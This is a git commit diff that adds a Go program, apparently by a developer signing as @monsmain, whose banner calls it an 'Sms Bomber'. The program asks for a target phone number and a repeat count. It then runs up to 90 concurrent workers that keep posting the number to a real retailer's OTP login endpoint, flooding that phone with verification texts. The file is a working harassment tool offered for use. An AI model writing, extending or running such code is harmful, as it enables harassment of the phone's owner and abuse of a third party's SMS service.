8431af5011baddb1a24c0701c718b7914cf9b0b9
monsmain <matinfarmani20@gmail.com>
2025-04-30 20:34:40 +0330

    Update sms1.go

--- sms1.go
+++ sms1.go
@@ -1,1 +1,752 @@
+package main
 
+
+
+import (
+
+"bytes"
+
+"context"
+
+"encoding/json"
+
+"fmt"
+
+"net" 
+
+"net/http"
+
+"net/url"
+
+"os"
+
+"os/exec"
+
+"os/signal"
+
+"runtime"
+
+"strings"
+
+"sync"
+
+"syscall"
+
+"time"  
+
+        "net/http/cookiejar"  
+
+)
+
+//Code by @monsmain
+
+func clearScreen() {
+
+cmd := exec.Command("clear")
+
+if runtime.GOOS == "windows" {
+
+cmd = exec.Command("cmd", "/c", "cls")
+
+}
+
+cmd.Stdout = os.Stdout
+
+cmd.Run()
+
+}
+
+
+
+func sendJSONRequest(client *http.Client, ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
+
+defer wg.Done()
+
+
+
+const maxRetries = 3
+
+const retryDelay = 2 * time.Second
+
+
+
+for retry := 0; retry < maxRetries; retry++ {
+
+select {
+
+case <-ctx.Done():
+
+fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
+
+ch <- 0
+
+return
+
+default:
+
+}
+
+
+
+jsonData, err := json.Marshal(payload)
+
+if err != nil {
+
+fmt.Printf("\033[01;31m[-] Error while encoding JSON for %s on retry %d: %v\033[0m\n", url, retry+1, err)
+
+if retry == maxRetries-1 {
+
+ch <- http.StatusInternalServerError
+
+return
+
+}
+
+time.Sleep(retryDelay)
+
+continue
+
+}
+
+
+
+req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
+
+if err != nil {
+
+fmt.Printf("\033[01;31m[-] Error while creating request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
+
+if retry == maxRetries-1 {
+
+ch <- http.StatusInternalServerError
+
+return
+
+}
+
+time.Sleep(retryDelay)
+
+continue
+
+}
+
+req.Header.Set("Content-Type", "application/json")
+
+
+
+
+resp, err := client.Do(req)
+
+if err != nil {
+
+if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
+
+fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
+
+if retry == maxRetries-1 {
+
+fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
+
+ch <- http.StatusInternalServerError
+
+return
+
+}
+
+time.Sleep(retryDelay)
+
+continue
+
+} else if ctx.Err() == context.Canceled {
+
+fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
+
+ch <- 0
+
+return
+
+} else {
+
+fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
+
+ch <- http.StatusInternalServerError
+
+return
+
+}
+
+}
+
+
+
+ch <- resp.StatusCode
+
+resp.Body.Close()
+
+return
+
+}
+
+}
+
+//Code by @monsmain
+
+func sendFormRequest(client *http.Client, ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
+
+defer wg.Done()
+
+
+
+const maxRetries = 3
+
+const retryDelay = 3 * time.Second
+
+
+
+for retry := 0; retry < maxRetries; retry++ {
+
+select {
+
+case <-ctx.Done():
+
+fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
+
+ch <- 0
+
+return
+
+default:
+
+
+
+}
+
+
+
+req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
+
+if err != nil {
+
+fmt.Printf("\033[01;31m[-] Error while creating form request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
+
+if retry == maxRetries-1 {
+
+ch <- http.StatusInternalServerError
+
+return
+
+}
+
+time.Sleep(retryDelay)
+
+continue
+
+}
+
+req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+
+
+
+
+resp, err := client.Do(req)
+
+if err != nil {
+
+
+
+if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
+
+fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
+
+if retry == maxRetries-1 {
+
+fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
+
+ch <- http.StatusInternalServerError
+
+return
+
+}
+
+time.Sleep(retryDelay)
+
+continue
+
+} else if ctx.Err() == context.Canceled {
+
+fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
+
+ch <- 0
+
+return
+
+} else {
+
+
+
+fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
+
+ch <- http.StatusInternalServerError
+
+return
+
+}
+
+}
+
+
+
+ch <- resp.StatusCode
+
+resp.Body.Close()
+
+return
+
+}
+
+}
+
+func sendGETRequest(client *http.Client, ctx context.Context, url string, wg *sync.WaitGroup, ch chan<- int) {
+
+defer wg.Done()
+
+
+
+const maxRetries = 3
+
+const retryDelay = 2 * time.Second 
+
+
+
+for retry := 0; retry < maxRetries; retry++ {
+
+select {
+
+case <-ctx.Done():
+
+fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
+
+ch <- 0
+
+return
+
+default:
+
+}
+
+
+
+req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil) 
+
+if err != nil {
+
+fmt.Printf("\033[01;31m[-] Error while creating GET request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
+
+if retry == maxRetries-1 {
+
+ch <- http.StatusInternalServerError
+
+return
+
+}
+
+time.Sleep(retryDelay)
+
+continue
+
+}
+
+
+
+
+resp, err := client.Do(req)
+
+if err != nil {
+
+if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
+
+fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
+
+if retry == maxRetries-1 {
+
+fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
+
+ch <- http.StatusInternalServerError
+
+return
+
+}
+
+time.Sleep(retryDelay)
+
+continue
+
+} else if ctx.Err() == context.Canceled {
+
+fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
+
+ch <- 0
+
+return
+
+} else {
+
+fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
+
+ch <- http.StatusInternalServerError
+
+return
+
+}
+
+}
+
+
+
+ch <- resp.StatusCode
+
+resp.Body.Close()
+
+return 
+
+}
+
+}//Code by @monsmain
+
+func formatPhoneWithSpaces(p string) string {
+
+p = getPhoneNumberNoZero(p) 
+
+if len(p) >= 10 {
+
+if len(p) >= 10 {
+
+return p[0:3] + " " + p[3:6] + " " + p[6:10]
+
+}
+
+return p
+
+}
+
+return p 
+
+}
+
+func getPhoneNumberNoZero(phone string) string {
+
+if strings.HasPrefix(phone, "0") {
+
+return phone[1:]
+
+}
+
+return phone
+
+}
+
+
+
+func getPhoneNumber98NoZero(phone string) string {
+
+return "98" + getPhoneNumberNoZero(phone)
+
+}
+
+
+
+func getPhoneNumberPlus98NoZero(phone string) string {
+
+return "+98" + getPhoneNumberNoZero(phone)
+
+}
+
+func main() {
+
+clearScreen()
+
+
+
+fmt.Print("\033[01;32m")
+
+fmt.Print(`
+
+                                :-.                                   
+
+                         .:   =#-:-----:                              
+
+                           **%@#%@@@#*+==:                            
+
+                       :=*%@@@@@@@@@@@@@@%#*=:                        
+
+                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
+
+                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
+
+              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
+
+             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
+
+            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
+
+            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
+
+           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
+
+`)
+
+fmt.Print("\033[01;37m")
+
+fmt.Print(`
+
+           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
+
+           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
+
+           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
+
+           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
+
+            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
+
+            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
+
+            *@@%#             -@@@@@@.            #@@@+             
+
+             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#              
+
+             :@@*            =%@@@@@@%-  faster    *@@:              
+
+              #@@%         .*@@@@#%@@@%+.         %@@+              
+
+              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
+
+`)
+
+fmt.Print("\033[01;31m")
+
+fmt.Print(`
+
+              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=              
+
+               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
+
+                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
+
+                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
+
+                      #@@@@@@@@@@@@@@@@@@@@@@+                      
+
+                       *@@@@@@@@@@@@@@@@@@@@+                       
+
+                        +@@%*@@%@@@%%@%*@@%=                         
+
+                         +%+ %%.+@%:-@* *%-                          
+
+                          .  %# .%#  %+                              
+
+                             :.  %+  :.                              
+
+                                 -:                                  
+
+`)
+
+fmt.Print("\033[0m")
+
+
+
+
+
+fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
+
+fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
+
+var phone string
+
+fmt.Scan(&phone)
+
+
+
+var repeatCount int
+
+fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
+
+fmt.Scan(&repeatCount)
+
+
+
+var speedChoice string
+
+fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mChoose speed [medium/fast]: \033[00;36m")
+
+fmt.Scan(&speedChoice)
+
+
+
+var numWorkers int 
+
+//Code by @monsmain
+
+switch strings.ToLower(speedChoice) { 
+
+case "fast":
+
+
+
+numWorkers = 90 
+
+fmt.Println("\033[01;33m[*] Fast mode selected. Using", numWorkers, "workers.\033[0m")
+
+case "medium":
+
+
+
+numWorkers = 40 
+
+fmt.Println("\033[01;33m[*] Medium mode selected. Using", numWorkers, "workers.\033[0m")
+
+default:
+
+
+
+numWorkers = 40 
+
+fmt.Println("\033[01;31m[-] Invalid speed choice. Defaulting to medium mode using", numWorkers, "workers.\033[0m")
+
+}//Code by @monsmain
+
+
+
+
+
+ctx, cancel := context.WithCancel(context.Background())
+
+signalChan := make(chan os.Signal, 1)
+
+
+
+signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)
+
+
+
+go func() {
+
+<-signalChan
+
+fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
+
+cancel()
+
+}()
+
+
+
+cookieJar, _ := cookiejar.New(nil)
+
+client := &http.Client{
+
+Jar: cookieJar,
+
+        Timeout: 10 * time.Second,
+
+}
+
+
+
+tasks := make(chan func(), repeatCount*40)
+
+
+
+var wg sync.WaitGroup
+
+
+
+ch := make(chan int, repeatCount*40)
+
+
+
+for i := 0; i < numWorkers; i++ {
+
+go func() {
+
+for task := range tasks {
+
+task()
+
+}
+
+}()
+
+}
+
+
+
+for i := 0; i < repeatCount; i++ {
+
+
+
+
+
+
+
+
+
+
+
+// snapp.market - ممکن است تکراری باشد
+
+wg.Add(1)
+
+tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
+
+return func() {
+
+formData := url.Values{}
+
+formData.Set("cellphone", phone)
+
+urlWithQuery := "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=" + phone
+
+sendFormRequest(c, ctx, urlWithQuery, formData, &wg, ch) // ارسال c
+
+}
+
+}(client) 
+
+
+
+
+
+}
+
+
+
+close(tasks)
+
+
+
+go func() {
+
+wg.Wait()
+
+close(ch)
+
+}()
+
+
+
+for statusCode := range ch {
+
+if statusCode >= 400 || statusCode == 0 {
+
+fmt.Println("\033[01;31m[-] Error or Canceled!")
+
+} else {
+
+fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
+
+}
+
+}
+
+}
